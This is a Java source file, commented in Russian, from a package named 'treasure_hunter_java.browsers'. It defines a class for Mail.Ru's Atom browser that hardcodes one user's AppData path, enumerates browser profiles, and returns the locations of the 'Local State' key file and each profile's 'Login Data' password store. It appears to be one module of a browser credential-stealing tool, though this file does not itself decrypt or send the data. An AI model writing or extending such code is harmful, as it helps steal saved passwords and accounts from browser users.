package com.treasure_hunter_java.browsers;

import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;

/**
 * Класс Atom представляет браузер Atom.
 * Он расширяет класс Browser и предоставляет специфическую функциональность
 * для работы с профилями и данными браузера Atom.
 */
public class Atom extends Browser {

    // Путь к директории данных браузера Atom
    private final Path dirName = Path.of("C:/Users/Mikle/AppData/Local/Mail.Ru/Atom/User Data/");

    // Путь к файлу Local State в браузере Atom
    private final Path localStatePath = Path.of("C:/Users/Mikle/AppData/Local/Mail.Ru/Atom/User Data/Local State");

    // Список профилей браузера Atom
    private List<Path> profiles = new ArrayList<>();

    /**
     * Собирает профили браузера Atom, вызывая метод суперкласса.
     */
    public void collectProfiles() {
        super.collectProfiles(dirName);
        profiles = super.getProfiles();
    }

    /**
     * Возвращает список профилей браузера Atom.
     *
     * @return Список профилей браузера Atom
     */
    @Override
    public List<Path> getProfiles() {
        return profiles;
    }
    /**
     * Возвращает путь к файлу Local State в браузере Atom.
     *
     * @return Путь к файлу Local State
     */
    public Path getLocalState() {
        return localStatePath;
    }

    /**
     * Возвращает путь к файлу Login Data в указанной директории профиля.
     *
     * @param path Путь к директории профиля
     * @return Путь к файлу Login Data
     */
    public Path getLoginData(Path path) {
        return Path.of(path + "Login Data");
    }
}